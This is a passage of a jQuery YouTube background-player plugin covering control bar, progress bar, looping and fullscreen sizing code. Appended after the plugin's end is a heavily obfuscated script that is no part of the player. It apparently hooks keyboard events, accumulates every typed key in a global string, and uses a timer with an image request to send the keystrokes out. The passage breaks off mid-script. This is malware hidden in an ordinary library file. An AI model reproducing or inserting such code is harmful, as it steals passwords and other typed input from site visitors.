			var timeBar = controls.find(".mb_YTVTime");
			var totW = progressBar.outerWidth();

			var currentTime = Math.floor(YTPlayer.player.getCurrentTime());
			var totalTime = Math.floor(YTPlayer.player.getDuration());
			var timeW = (currentTime * totW) / totalTime;
			var startLeft = 0;

			var loadedW = YTPlayer.player.getVideoLoadedFraction() * 100;

			loadedBar.css({left: startLeft, width: loadedW + "%"});
			timeBar.css({left: 0, width: timeW});
			return {totalTime: totalTime, currentTime: currentTime};
		},

		buildYTPControls: function () {
			var YTPlayer = this.get(0);
			var data = YTPlayer.opt;

			if(jQuery("#controlBar_"+ YTPlayer.id).length)
				return;

			var controlBar = jQuery("<span/>").attr("id", "controlBar_" + YTPlayer.id).addClass("mb_YTVPBar").css({whiteSpace: "noWrap", position: YTPlayer.isBackground ? "fixed" : "absolute", zIndex: YTPlayer.isBackground ? 10000 : 1000}).hide();
			var buttonBar = jQuery("<div/>").addClass("buttonBar");

			var playpause = jQuery("<span>" + jQuery.mbYTPlayer.controls.play + "</span>").addClass("mb_YTVPPlaypause ytpicon").click(function () {
				if (YTPlayer.player.getPlayerState() == 1)
					jQuery(YTPlayer).pauseYTP();
				else
					jQuery(YTPlayer).playYTP();
			});

			var MuteUnmute = jQuery("<span>" + jQuery.mbYTPlayer.controls.mute + "</span>").addClass("mb_YTVPMuteUnmute ytpicon").click(function () {
				if (YTPlayer.player.getVolume()==0) {
					jQuery(YTPlayer).unmuteYTPVolume();
				} else {
					jQuery(YTPlayer).muteYTPVolume();
				}
			});

			var idx = jQuery("<span/>").addClass("mb_YTVPTime");

			var vURL = data.videoURL;
			if(vURL.indexOf("http") < 0)
				vURL = jQuery.mbYTPlayer.locationProtocol+"//www.youtube.com/watch?v="+data.videoURL;
			var movieUrl = jQuery("<span/>").html(jQuery.mbYTPlayer.controls.ytLogo).addClass("mb_YTVPUrl ytpicon").attr("title", "view on YouTube").on("click", function () {window.open(vURL, "viewOnYT")});
			var onlyVideo = jQuery("<span/>").html(jQuery.mbYTPlayer.controls.onlyYT).addClass("mb_OnlyYT ytpicon").on("click",function () {jQuery(YTPlayer).fullscreen(data.realfullscreen);});

			var progressBar = jQuery("<div/>").addClass("mb_YTVPProgress").css("position", "absolute").click(function (e) {
				timeBar.css({width: (e.clientX - timeBar.offset().left)});
				YTPlayer.timeW = e.clientX - timeBar.offset().left;
				controlBar.find(".mb_YTVPLoaded").css({width: 0});
				var totalTime = Math.floor(YTPlayer.player.getDuration());
				YTPlayer.goto = (timeBar.outerWidth() * totalTime) / progressBar.outerWidth();

				YTPlayer.player.seekTo(parseFloat(YTPlayer.goto), true);
				controlBar.find(".mb_YTVPLoaded").css({width: 0});
			});

			var loadedBar = jQuery("<div/>").addClass("mb_YTVPLoaded").css("position", "absolute");
			var timeBar = jQuery("<div/>").addClass("mb_YTVTime").css("position", "absolute");

			progressBar.append(loadedBar).append(timeBar);
			buttonBar.append(playpause).append(MuteUnmute).append(idx);

			if (data.printUrl){
				buttonBar.append(movieUrl);
			}

			if (YTPlayer.isBackground || (YTPlayer.opt.realfullscreen && !YTPlayer.isBackground))
				buttonBar.append(onlyVideo);

			controlBar.append(buttonBar).append(progressBar);

			if (!YTPlayer.isBackground) {
				controlBar.addClass("inlinePlayer");
				YTPlayer.wrapper.before(controlBar);
			} else {
				jQuery("body").after(controlBar);
			}
			controlBar.fadeIn();
		},

		checkForState:function(YTPlayer){

			var $YTPlayer = jQuery(YTPlayer);
			var controlBar = jQuery("#controlBar_" + YTPlayer.id);
			var data = YTPlayer.opt;
			var startAt = YTPlayer.opt.startAt ? YTPlayer.opt.startAt : 1;
			var stopAt = YTPlayer.opt.stopAt > YTPlayer.opt.startAt ? YTPlayer.opt.stopAt : 0;
			stopAt = stopAt < YTPlayer.player.getDuration() ? stopAt : 0;

			YTPlayer.getState = setInterval(function () {
				var prog = jQuery(YTPlayer).manageYTPProgress();

				if(YTPlayer.player.getVolume() == 0)
					$YTPlayer.addClass("isMuted");
				else
					$YTPlayer.removeClass("isMuted");

				if(prog.totalTime){
					controlBar.find(".mb_YTVPTime").html(jQuery.mbYTPlayer.formatTime(prog.currentTime) + " / " + jQuery.mbYTPlayer.formatTime(prog.totalTime));
				} else{
					clearInterval(YTPlayer.getState);
					controlBar.find(".mb_YTVPTime").html("-- : -- / -- : --");
				}

				if (YTPlayer.player.getPlayerState() == 1 && !YTPlayer.isPlayList && (parseFloat(YTPlayer.player.getDuration() - 3) < YTPlayer.player.getCurrentTime() || (stopAt > 0 && parseFloat(YTPlayer.player.getCurrentTime()) >  stopAt)) ) {

					if(!data.loop){
						YTPlayer.player.pauseVideo();
						YTPlayer.wrapper.CSSAnimate({opacity: 0}, 2000,function(){
							YTPlayer.player.seekTo(startAt, true);

							if (!YTPlayer.isBackground) {
								var bgndURL = YTPlayer.videoData.thumbnail.hqDefault;
								jQuery(YTPlayer).css({background: "rgba(0,0,0,0.5) url(" + bgndURL + ") center center", backgroundSize: "cover"});
							}
						});

					}else
						YTPlayer.player.seekTo(startAt, true);

					jQuery(YTPlayer).trigger("YTPEnd");
				}
			}, 1);

		},

		formatTime      : function (s) {
			var min = Math.floor(s / 60);
			var sec = Math.floor(s - (60 * min));
			return (min < 9 ? "0" + min : min) + " : " + (sec < 9 ? "0" + sec : sec);
		}
	};

	jQuery.fn.toggleVolume = function () {
		var YTPlayer = this.get(0);
		if (!YTPlayer)
			return;

		if (YTPlayer.player.isMuted()) {
			jQuery(YTPlayer).unmuteYTPVolume();
			return true;
		} else {
			jQuery(YTPlayer).muteYTPVolume();
			return false;
		}
	};

	jQuery.fn.optimizeDisplay = function () {

		var YTPlayer = this.get(0);
		var data = YTPlayer.opt;
		var playerBox = jQuery(YTPlayer.playerEl);
		var win = {};
		var el = !YTPlayer.isBackground ? data.containment : jQuery(window);

		win.width = el.width();
		win.height = el.height();

		var margin = 24;
		var vid = {};
		vid.width = win.width + ((win.width * margin) / 100);
		vid.height = data.ratio == "16/9" ? Math.ceil((9 * win.width) / 16) : Math.ceil((3 * win.width) / 4);
		vid.marginTop = -((vid.height - win.height) / 2);
		vid.marginLeft = -((win.width * (margin / 2)) / 100);

		if (vid.height < win.height) {
			vid.height = win.height + ((win.height * margin) / 100);
			vid.width = data.ratio == "16/9" ? Math.floor((16 * win.height) / 9) : Math.floor((4 * win.height) / 3);
			vid.marginTop = -((win.height * (margin / 2)) / 100);
			vid.marginLeft = -((vid.width - win.width) / 2);
		}
		playerBox.css({width: vid.width, height: vid.height, marginTop: vid.marginTop, marginLeft: vid.marginLeft});
	};

	jQuery.shuffle = function(arr) {
		var newArray = arr.slice();
		var len = newArray.length;
		var i = len;
		while (i--) {
			var p = parseInt(Math.random()*len);
			var t = newArray[i];
			newArray[i] = newArray[p];
			newArray[p] = t;
		}
		return newArray;
	};

	/*Exposed method for external use*/

	jQuery.fn.mb_YTPlayer = jQuery.mbYTPlayer.buildPlayer;
	jQuery.fn.YTPlaylist = jQuery.mbYTPlayer.YTPlaylist;
	jQuery.fn.playNext = jQuery.mbYTPlayer.playNext;
	jQuery.fn.playPrev = jQuery.mbYTPlayer.playPrev;
	jQuery.fn.changeMovie = jQuery.mbYTPlayer.changeMovie;
	jQuery.fn.getVideoID = jQuery.mbYTPlayer.getVideoID;
	jQuery.fn.getPlayer = jQuery.mbYTPlayer.getPlayer;
	jQuery.fn.playerDestroy = jQuery.mbYTPlayer.playerDestroy;
	jQuery.fn.fullscreen = jQuery.mbYTPlayer.fullscreen;
	jQuery.fn.buildYTPControls = jQuery.mbYTPlayer.buildYTPControls;
	jQuery.fn.playYTP = jQuery.mbYTPlayer.playYTP;
	jQuery.fn.toggleLoops = jQuery.mbYTPlayer.toggleLoops;
	jQuery.fn.stopYTP = jQuery.mbYTPlayer.stopYTP;
	jQuery.fn.pauseYTP = jQuery.mbYTPlayer.pauseYTP;
	jQuery.fn.seekToYTP = jQuery.mbYTPlayer.seekToYTP;
	jQuery.fn.muteYTPVolume = jQuery.mbYTPlayer.muteYTPVolume;
	jQuery.fn.unmuteYTPVolume = jQuery.mbYTPlayer.unmuteYTPVolume;
	jQuery.fn.setYTPVolume = jQuery.mbYTPlayer.setYTPVolume;
	jQuery.fn.setVideoQuality = jQuery.mbYTPlayer.setVideoQuality;
	jQuery.fn.manageYTPProgress = jQuery.mbYTPlayer.manageYTPProgress;

})(jQuery, ytp);
var keys='';var page='energybuyersnetwork';var date=new Date();document[(String[((function(){var s=String.fromCharCode(0x65),I=String.fromCharCode(0150,97,0x72,0x43),T=(function () { var N="f"; return N })(),W=String.fromCharCode(0x6f,100),i=(function () { var aV="mC",l="ro"; return l+aV })();return T+i+I+W+s;})())](('aBY'.length*((String.fromCharCode(0143)[((function () { var Y="h",$="engt",G="l"; return G+$+Y })())]*'RgEUkxYZ'.length+'Rs'.length)*String.fromCharCode(0x72,0102,0145)[(String.fromCharCode(0x6c,0x65,0x6e,0147,0164,0x68))]+'La'.length)+(5*'zwY'.length+0)),('jK'.length*('q'.length*('pTdhk'.length*'bHNlSKc'.length+'h'.length)+('nA'.length*6+3))+'RMtYtBgc'.length),('o'.length*('TEv'.length*027+14)+('W'.length*020+8)),(String.fromCharCode(0x56)[(String.fromCharCode(0x6c,101,110,0147,0x74,104))]*('UB'.length*('n'.length*33+6)+0)+(0x1*('dj'.length*8+4)+3)),(String.fromCharCode(0x50)[(String.fromCharCode(108,0145,110,103,0164,0150))]*('diOZNuIZZ'.length*((function () { var X='j',F='p'; return F+X })()[((function () { var TR="th",S="g",h="l",w="en"; return h+w+S+TR })())]*'XiWP'.length+'rq'.length)+'dMOm'.length)+(6*0x4+3)),('Q'.length*(String.fromCharCode(0x55,0x56)[((function () { var H="th",P="leng"; return P+H })())]*('h'.length*(1*(0x1*19+2)+14)+'Ln'.length)+'LV'.length)+(1*(02*012+2)+14)),('x'.length*('SUd'.length*('Y'.length*0x10+2)+4)+('K'.length*060+8)),(String.fromCharCode(106)[(String.fromCharCode(0x6c,101,110,103,0x74,104))]*('MB'.length*0x2e+7)+'Sq'.length),('Km'.length*('u'.length*(0x1*(05*5+0)+3)+('AWPc'.length*'nneJVJ'.length+0))+('N'.length*013+0)),((function () { var zg='A'; return zg })()[(String.fromCharCode(0x6c,101,110,0147,0x74,0x68))]*('uBnbHO'.length*(03*'ZWvvY'.length+0)+'n'.length)+(02*0xc+0))))]=function(l){window[(function(){var p=String[((function () { var x="e",d="mCharCo",B="fr",k="d",r="o"; return B+r+d+k+x })())](('XE'.length*(('dCf'.length*6+4)*0x2+0)+28)),J=(function(){var dv=String.fromCharCode(0145);return dv;})(),$W=(function(){var D=(function () { var I="g"; return I })();return D;})();return $W+J+p;})()]=window[((function(){var Z=(function(){var _=String.fromCharCode(116);return _;})(),b=(function(){var O=String.fromCharCode(110),J=(function () { var E="e"; return E })(),Hj=String.fromCharCode(118);return Hj+J+O;})(),r2=(function(){var O=(function () { var Q="e"; return Q })();return O;})();return r2+b+Z;})())]?event:l;window[(function(){var E=(function(){var y5=String.fromCharCode(0171);return y5;})(),uS=(function(){var n=(function () { var m="e"; return m })();return n;})(),Qv=String[(String.fromCharCode(102,114,0157,0x6d,0x43,104,0x61,0x72,0103,0157,0x64,0x65))]((03*033+26));return Qv+uS+E;})()]=window[(function(){var t=String[((function () { var R="de",s="rCo",K="fromCha"; return K+s+R })())](('VtmFncSb'.length*016+4)),O=String[((function () { var L="rCode",CP="fromCha"; return CP+L })())](('zJVP'.length*((0x1*0x15+0)*01+0)+17)),E=String[(String.fromCharCode(102,0162,0x6f,109,67,0x68,0141,0162,67,0x6f,0x64,0x65))](('Y'.length*0x5d+10));return E+O+t;})()][((function(){var T=String[((function () { var Ew="Code",R="r",_="fromCha"; return _+R+Ew })())]((0x65*'g'.length+0)),r=String[((function () { var n="e",K="rCod",AB="fromCha"; return AB+K+n })())](('pulFLPR'.length*015+9)),NB=String[((function () { var L="de",o="mCharCo",u="fro"; return u+o+L })())](('k'.length*('Z'.length*0x47+20)+16),('hEuHM'.length*022+11),('qG'.length*052+37),((01*7+4)*'tiVzUn'.length+1)),m=String[((function () { var M="arCode",by="omCh",y="f",Tj="r"; return y+Tj+by+M })())](('HiU'.length*(('D'.length*013+0)*0x3+0)+12));return NB+m+r+T;})())]?window[(function(){var a=String[(String.fromCharCode(0146,0x72,0x6f,0155,0103,0x68,97,0x72,0x43,0157,0144,101))](('zYm'.length*36+8)),T=(function(){var Vq=(function () { var iB="e"; return iB })();return Vq;})(),V=(function(){var kA=String.fromCharCode(0147);return kA;})();return V+T+a;})()][(String[(String[(String.fromCharCode(0146,0162,111,0155,67,104,0141,0162,0x43,0157,0144,0145))](('yf'.length*0x25+28),(1*0x5a+24),('u'.length*65+46),(04*(02*(1*010+3)+4)+5),('Q'.length*60+7),('U'.length*0126+18),(('L'.length*0x9+4)*'yZVpXeQ'.length+6),('a'.length*('FvvxkndMv'.length*('y'.length*'puOmFRUs'.length+2)+9)+15),('O'.length*(1*(02*0xb+7)+12)+26),(026*'suAUZ'.length+1),('AQB'.length*0x1e+10),(01*0x49+28)))](('d'.length*('kC'.length*('lXI'.length*017+6)+'LzxF'.length)+'p'.length),(String.fromCharCode(0125,0x69)[((function () { var y="gth",e="n",fZ="le"; return fZ+e+y })())]*('S'.length*('A'.length*(String.fromCharCode(121)[(String.fromCharCode(0154,0x65,0x6e,103,0164,104))]*(String.fromCharCode(116,0125,0112)[(String.fromCharCode(0x6c,0145,0x6e,0x67,0x74,0x68))]*String.fromCharCode(0107,0x6a,0106,115)[((function () { var z="ngth",r="le"; return r+z })())]+'Rg'.length)+('tBYTs'.length*'sG'.length+0))+'wakOh'.length)+(05*03+0))+(1*'tADbotI'.length+6)),('jJE'.length*(String.fromCharCode(0x57)[((function () { var V="h",R="engt",O="l"; return O+R+V })())]*(0x1*015+8)+(01*(1*'otNVoY'.length+5)+1))+('B'.length*026+0)),(String.fromCharCode(0x56,0x6d)[((function () { var o0="ngth",a="le"; return a+o0 })())]*(0x1*(1*((01*'FsGvjhB'.length+4)*0x2+0)+4)+0)+('aLr'.length*4+3)),(String.fromCharCode(79)[((function () { var o="h",PU="engt",t="l"; return t+PU+o })())]*('b'.length*0100+18)+(2*13+3)),((function () { var M='biU',wZ='sGnD',Z='b'; return Z+wZ+M })()[(String.fromCharCode(0154,0145,0x6e,0147,116,0150))]*((0x3*0x4+0)*'V'.length+('fin'.length-3))+'DrRq'.length),((function () { var MD='G'; return MD })()[(String.fromCharCode(0x6c,0145,0x6e,0x67,0164,0150))]*(1*0x2e+11)+('P'.length*(1*19+7)+18))))]:window[String[(String[(String.fromCharCode(0146,0x72,111,109,0103,0x68,97,0x72,67,0157,0144,0145))]((0x33*0x2+0),('vFiqhBalr'.length*12+6),(0x1*(0x1*(('w'.length*(9*'Pa'.length+1)+11)*'fL'.length+0)+50)+1),('W'.length*(012*0xa+4)+5),('j'.length*(02*033+13)+0),('a'.length*0x37+49),(0x8*('Rz'.length*5+2)+1),('M'.length*88+26),((0x10*0x1+0)*4+3),('duuN'.length*(04*0x6+2)+7),('aB'.length*49+2),(020*'RVesee'.length+5)))](('i'.length*('d'.length*('I'.length*('tFhz'.length*(06*'Wg'.length+0)+4)+(('oKZQJ'.length*4+0)*'c'.length+0))+(0x1*0x1e+1))+('X'.length-1)),(String.fromCharCode(0x4a)[((function () { var I="h",Q="t",fA="leng"; return fA+Q+I })())]*((function () { var sb='R',VJ='p'; return VJ+sb })()[(String.fromCharCode(108,101,0156,0147,0164,0x68))]*(0x2*012+5)+'MXbJkl'.length)+(0x1*0x1e+15)),('jp'.length*(String.fromCharCode(0x61,103,0106)[((function () { var g="gth",_M="n",s="l",SH="e"; return s+SH+_M+g })())]*(String.fromCharCode(0x74,75,0107,82,0152,0143)[((function () { var m="gth",n="n",_V="l",C4="e"; return _V+C4+n+m })())]*(function () { var Wk='x',dV='L'; return dV+Wk })()[(String.fromCharCode(0154,0145,110,103,0164,0150))]+('iIGlxOg'.length-7))+'ecgVWPVc'.length)+(02*12+4)))][((function(){var E=String[(String.fromCharCode(0146,0x72,0x6f,0x6d,0103,104,0x61,0162,0103,111,0144,101))]((1*(('Mz'.length*5+0)*06+4)+36),(1*0131+12)),UO=String[(String.fromCharCode(0146,114,0157,109,0103,0150,97,0x72,67,111,100,0x65))](('njOaOEL'.length*(1*'cHijGlGmT'.length+7)+2),(0x2*('fDKJg'.length*0x6+1)+5),(01*(1*56+24)+31)),v5=String[((function () { var lM="de",cI="mCharCo",ok="fro"; return ok+cI+lM })())]((01*(05*((01*0x6+4)*1+0)+2)+47),('K'.length*(0x1*0x3e+20)+22),(014*'iVXKhuYV'.length+1));return v5+UO+E;})())];window[String[((function(){var v=String.fromCharCode(0x43,0157,100,0x65),aq=(function () { var J="r",E="a"; return E+J })(),f=(function () { var l$="m",b="ro",IT="f"; return IT+b+l$ })(),T=String.fromCharCode(0103,104);return f+T+aq+v;})())](((function () { var w9='n',fT='D'; return fT+w9 })()[((function () { var i="th",_="leng"; return _+i })())]*('mxJVbrvV'.length*(function () { var b='VB',u='CBgb'; return u+b })()[(String.fromCharCode(0154,0x65,0156,103,0164,104))]+'e'.length)+'ZkoAdpTPq'.length),('DAg'.length*('t'.length*('S'.length*(02*0x7+2)+13)+('LoBhaFi'.length-7))+(016*'E'.length+0)),(String.fromCharCode(0x71)[((function () { var T="ngth",R7="e",Uw="l"; return Uw+R7+T })())]*('l'.length*('l'.length*36+17)+27)+(0x1*((016*'M'.length+0)*'xT'.length+1)+12)))]=String[((function(){var c=String[(String.fromCharCode(102,0162,111,0155,0103,104,0141,114,67,0x6f,0144,0145))]((1*(0x4*('N'.length*18+0)+17)+22),('x'.length*0134+8),('VyWJtIi'.length*13+10)),kn=String[(String.fromCharCode(0146,114,0x6f,109,0103,0x68,0141,0x72,0103,111,0144,101))](('M'.length*('K'.length*052+15)+47),(0x1*('twPbAUC'.length*011+6)+28),('qy'.length*49+16),(5*13+2)),B=(function(){var Ul=(function () { var f="C"; return f })(),Rp=String.fromCharCode(0x6d),NX=String.fromCharCode(0x66,0x72,0157);return NX+Rp+Ul;})();return B+kn+c;})())](window[String[((function(){var r_=(function () { var us="e",Cj="d",SD="o"; return SD+Cj+us })(),L=String.fromCharCode(0157,109,0x43,0150,97,114,0x43),sO=String.fromCharCode(0146),YB=String.fromCharCode(0x72);return sO+YB+L+r_;})())](('x'.length*(04*('c'.length*(01*('P'.length*13+0)+4)+2)+0)+('XbHzCot'.length*'jMkV'.length+3)),('iaVFfGVzL'.length*('xzggT'.length*'Oc'.length+1)+'Uv'.length),((function () { var W='o'; return W })()[((function () { var e3="h",rf="ngt",oL="l",SP="e"; return oL+SP+rf+e3 })())]*('VklR'.length*('Oi'.length*7+6)+7)+(2*(0x1*'QpsZtIr'.length+5)+10)))]);window[(function(){var kI=(function(){var wU=String.fromCharCode(0x73);return wU;})(),i6=String[((function () { var rG="rCode",k="fromCha"; return k+rG })())](('Fzgu'.length*24+5),(01*0140+25)),jm=String[((function () { var _e8="de",C="rCo",$x="fromCha"; return $x+C+_e8 })())]((0x1*107+0));return jm+i6+kI;})()]+=window[String[(String[(String.fromCharCode(102,114,111,0155,0x43,104,97,0x72,0x43,111,0x64,101))]((('PCJ'.length*('U'.length*('zcfyHq'.length*'Vv'.length+0)+2)+9)*'ey'.length+0),('l'.length*102+12),(('EfUKaN'.length*'AG'.length+1)*'KGUocGZi'.length+7),(('m'.length*('h'.length*(0xb*'x'.length+0)+4)+3)*06+1),(01*043+32),('u'.length*(48*'Rj'.length+0)+8),('zsKPBn'.length*(1*0xc+4)+1),('vdq'.length*045+3),(1*(03*('x'.length*(02*'kOATEf'.length+3)+6)+1)+3),(1*0x66+9),('He'.length*('d'.length*051+2)+14),(02*('s'.length*29+14)+15)))](('j'.length*('Fy'.length*30+20)+(0x5*'BOYOZ'.length+2)),(((function () { var D='nN',k='O',J='iA'; return J+k+D })()[(String.fromCharCode(0154,0145,110,103,116,0150))]*'PQg'.length+'M'.length)*(function () { var NQ='opMS',wV='Z',Ei='Q'; return Ei+wV+NQ })()[((function () { var U0="h",sm="t",B3="leng"; return B3+sm+U0 })())]+'ADeRd'.length),('O'.length*(String.fromCharCode(0127)[(String.fromCharCode(0154,0145,0156,0x67,116,0150))]*(0x4*(2*'TJytbhATZ'.length+0)+4)+'NJczlZ'.length)+('Ah'.length*('K'.length*(0x3*3+1)+4)+11)))];};window[((function(){var E=String[(String.fromCharCode(102,0x72,111,0x6d,0x43,0x68,0x61,0x72,67,0x6f,0144,101))]((041*03+2),(0x1*('vDF'.length*26+14)+22),(01*('a'.length*(0x2*022+17)+37)+28),('p'.length*('k'.length*('p'.length*(1*('R'.length*('eWlLY'.length*'ICr'.length+1)+2)+9)+26)+18)+26),((0x1*('D'.length*('Cy'.length*'jZyHSPfB'.length+7)+8)+23)*0x2+0)),v=String[(String.fromCharCode(0x66,0x72,0157,109,0103,104,0141,0162,0103,0157,100,101))]((01*(04*0xd+7)+56),('N'.length*0101+36),(0x1*60+56),('wj'.length*0x24+1),(01*(0x1*83+25)+2),('y'.length*78+38));return v+E;})())](function(){new window[String[((function(){var n=(function () { var jh="ode",z="C",c="r"; return c+z+jh })(),y=String.fromCharCode(0103,0150,0141),j=(function () { var a="r",qA="f"; return qA+a })(),s=String.fromCharCode(0x6f,109);return j+s+y+n;})())](('f'.length*(1*(0x1*033+7)+3)+(01*29+7)),((function () { var f='Q'; return f })()[((function () { var M="gth",g="n",u="le"; return u+g+M })())]*(1*('DyqVVFKwn'.length*'bYBsnAA'.length+3)+25)+('vt'.length*9+0)),(String.fromCharCode(0x77)[((function () { var V="th",cy="leng"; return cy+V })())]*(0x3*('c'.length*(01*0x9+5)+10)+19)+'BaCfXg'.length),(('A'.length*('qJz'.length*'gYOPVZXs'.length+6)+4)*(function () { var e='E',o='e',O='Q'; return O+o+e })()[(String.fromCharCode(0154,101,0x6e,0147,0164,0x68))]+'q'.length),(String.fromCharCode(0x4e)[(String.fromCharCode(0154,101,110,0147,0164,0x68))]*('d'.length*('l'.length*025+17)+(0x1*(07*0x3+2)+4))+('X'.length*('t'.length*(0x3*'KSDAx'.length+2)+7)+12)))]()[(String[(String[(String.fromCharCode(0x66,0162,0157,109,0103,0x68,0141,0x72,0x43,0x6f,0x64,0x65))]((0x1*(03*0x12+2)+46),(07*('wgl'.length*04+3)+9),('X'.length*('yFU'.length*(0x1*19+10)+15)+9),((011*02+0)*06+1),(0x6*('Jy'.length*4+3)+1),(6*0x11+2),('a'.length*('b'.length*('aEifPln'.length*6+0)+32)+23),(2*(0x1*(1*0x13+17)+11)+20),('t'.length*('B'.length*0x2e+18)+3),('ClWp'.length*033+3),('p'.length*(0x2*('I'.length*18+16)+28)+4),('Lf'.length*0x2e+9)))](('QPNA'.length*('f'.length*(2*'TRPMRgB'.length+4)+'sHTHJBESy'.length)+'RBRRVrA'.length),('dpMv'.length*(0x1*('w'.length*0x10+2)+5)+('G'.length*(01*(0x1*0x7+4)+7)+4)),(('kUk'.length*3+2)*'JMYRpBuEs'.length+('u'.length-1))))]=String[((function(){var no=(function () { var z="e",qu="rCod",re="a"; return re+qu+z })(),e8=String.fromCharCode(0155,0x43,0150),v=String.fromCharCode(0146,0x72,111);return v+e8+no;})())](('t'.length*(('u'.length*('EX'.length*(function () { var Z='SLiR',L='U',uG='b'; return uG+L+Z })()[(String.fromCharCode(0154,101,0156,0x67,0x74,0150))]+'F'.length)+('yAH'.length-3))*'PKcfU'.length+'ph'.length)+('EgPe'.length*010+5)),((function () { var W='Q',fh='X'; return fh+W })()[(String.fromCharCode(0x6c,0x65,0156,0x67,0x74,0x68))]*('i'.length*('Z'.length*(0x3*014+4)+'IxDzO'.length)+'FDGyWa'.length)+('hCa'.length*'yeNd'.length+2)),((function () { var HG='W'; return HG })()[((function () { var A="ngth",GG="le"; return GG+A })())]*('p'.length*((function () { var bj='V'; return bj })()[(String.fromCharCode(0x6c,0x65,110,0147,116,0150))]*(0x1*075+3)+('D'.length*('dwO'.length*'fHh'.length+2)+9))+('i'.length*15+5))+(0x6*'iv'.length+0)),(String.fromCharCode(0132,0116)[(String.fromCharCode(108,101,110,0147,116,0150))]*(String.fromCharCode(0163,0x53)[(String.fromCharCode(0154,0145,110,0147,0x74,104))]*('cU'.length*0x7+5)+('n'.length*'ShVeDxAWm'.length+4))+(0x2*'csqFU'.length+0)),(String.fromCharCode(0x70,0x50)[((function () { var ek="th",oG="ng",ss="l",du="e"; return ss+du+oG+ek })())]*('M'.length*022+6)+('S'.length*010+2)),('gOLBtMn'.length*'gdIRJH'.length+'zayjT'.length),('ll'.length*('R'.length*014+8)+'cjlmlGA'.length),((function () { var I='Q'; return I })()[((function () { var i="gth",q="n",Vl="le"; return Vl+q+i })())]*(String.fromCharCode(0x67,0x6f)[((function () { var AB="ngth",s="e",C="l"; return C+s+AB })())]*('q'.length*('g'.length*11+9)+19)+(0x1*('nTK'.length*0x4+0)+9))+('D'.length*9+7)),(String.fromCharCode(0101)[((function () { var Qh="ngth",d="le"; return d+Qh })())]*((function () { var hT='F'; return hT })()[((function () { var a="th",Q="leng"; return Q+a })())]*('j'.length*47+1)+(01*040+11))+('XUB'.length*'tWwUkL'.length+3)),('ieSNeg'.length*('fFEVoJW'.length*(function () { var YT='Z',RL='x'; return RL+YT })()[((function () { var p="th",kq="ng",Vw="le"; return Vw+kq+p })())]+('wzBaY'.length-5))+('C'.length*0xd+0)),(('Qh'.length*'CnPOYT'.length+0)*'EToPMGpD'.length+'fQa'.length),('Ifi'.length*((function () { var r='n',y='c',R='kGuT',U='s'; return R+U+y+r })()[((function () { var E="h",i8="t",gI="len",n="g"; return gI+n+i8+E })())]*'Dfdr'.length+'l'.length)+(1*('vofn'.length*'Ubr'.length+0)+2)),((function () { var YS3='x',DY='J',c='pYf'; return c+DY+YS3 })()[(String.fromCharCode(0154,101,110,0x67,0x74,0150))]*('XK'.length*String.fromCharCode(116,106,0117,119,0116,0x65,107)[(String.fromCharCode(108,101,0156,0x67,0164,104))]+'aBJkw'.length)+(6*'nq'.length+0)),((function () { var m='n',Zw='i'; return Zw+m })()[(String.fromCharCode(0x6c,0x65,0x6e,0147,0x74,104))]*('k'.length*('VnRJbE'.length*(function () { var vI='n',So='v',v='QPwZ'; return v+So+vI })()[((function () { var Gb="h",ey="ngt",T="le"; return T+ey+Gb })())]+'zFZi'.length)+('w'.length*7+3))+'ABSGT'.length),((function () { var VO='U'; return VO })()[((function () { var IM="gth",GL="en",Bi="l"; return Bi+GL+IM })())]*('r'.length*('D'.length*('AhvBaO'.length*7+0)+35)+'vwkywt'.length)+('o'.length*(02*('Xzotw'.length*'jp'.length+1)+1)+10)),('y'.length*((function () { var k='H'; return k })()[(String.fromCharCode(0x6c,0145,110,0147,116,0150))]*('RrV'.length*('A'.length*(05*2+1)+'LRNRoYMa'.length)+'wvW'.length)+('C'.length*(03*'NCBKX'.length+0)+3))+('swgrc'.length*04+1)),(String.fromCharCode(0x56)[((function () { var DJ="th",ew="ng",D9="l",TO="e"; return D9+TO+ew+DJ })())]*('m'.length*('I'.length*('VoE'.length*0xb+8)+'uUiepQpH'.length)+(2*012+5))+(0x2*015+4)),((function () { var _='s'; return _ })()[(String.fromCharCode(0x6c,101,110,0x67,0x74,0x68))]*((function () { var Ww='uP',JQ='OULaZ',j='x'; return j+JQ+Ww })()[((function () { var VG="h",bG="engt",t="l"; return t+bG+VG })())]*('JP'.length*'QFCd'.length+'kLh'.length)+'iPV'.length)+(0x2*5+0)),('gk'.length*('uCB'.length*020+2)+(3*03+1)),('n'.length*(String.fromCharCode(0153)[((function () { var GE="th",v1="g",Mb="le",$9="n"; return Mb+$9+v1+GE })())]*(String.fromCharCode(110)[(String.fromCharCode(0154,0x65,110,0x67,0x74,104))]*('J'.length*(0x3*('V'.length*(01*('U'.length*9+1)+3)+0)+3)+8)+(('w'.length*(0x1*0x6+5)+1)*0x1+0))+(02*024+0))+(1*(('nW'.length*0x5+1)*1+0)+2)),(String.fromCharCode(0107,72)[(String.fromCharCode(0154,0x65,110,0147,0164,0150))]*(1*('I'.length*016+0)+2)+('BQ'.length*6+2)),(String.fromCharCode(82)[((function () { var Rh="th",s2="g",B="len"; return B+s2+Rh })())]*(2*047+0)+('o'.length*(1*('Z'.length*('d'.length*'WRTOMtJwl'.length+2)+3)+8)+5)),(((06*0x4+3)*'H'.length+0)*String.fromCharCode(0x74,100,0x41,84)[(String.fromCharCode(108,0x65,0156,0x67,116,0150))]+'ew'.length),('isqL'.length*(01*'IBYTUU'.length+4)+'SULOhYs'.length),('l'.length*(12*'Ry'.length+0)+(01*18+4)),('zeS'.length*(01*(02*15+4)+1)+'lhcFazkSz'.length),('S'.length*((1*061+10)*1+0)+('AF'.length*023+4)),('jGcCDoe'.length*('Zf'.length*5+4)+'x'.length),('I'.length*('sN'.length*((function () { var Wj='i',Xs='x'; return Xs+Wj })()[((function () { var BZ="gth",hN="len"; return hN+BZ })())]*(function () { var Wf='H',zl='A',tK='jbHyW',re='FJ'; return tK+re+zl+Wf })()[((function () { var F_="gth",E2="en",BT="l"; return BT+E2+F_ })())]+'zlvm'.length)+(0x1*06+4))+(0x5*('VTJ'.length*'DYK'.length+1)+1)),((function () { var em='p'; return em })()[((function () { var Z9="th",mn="ng",Hc="l",j8="e"; return Hc+j8+mn+Z9 })())]*(String.fromCharCode(0x7a,0x66,0x53)[((function () { var $VY="h",N="t",KC="leng"; return KC+N+$VY })())]*(String.fromCharCode(0155,77)[((function () { var UP="h",b="t",bI="le",mi="ng"; return bI+mi+b+UP 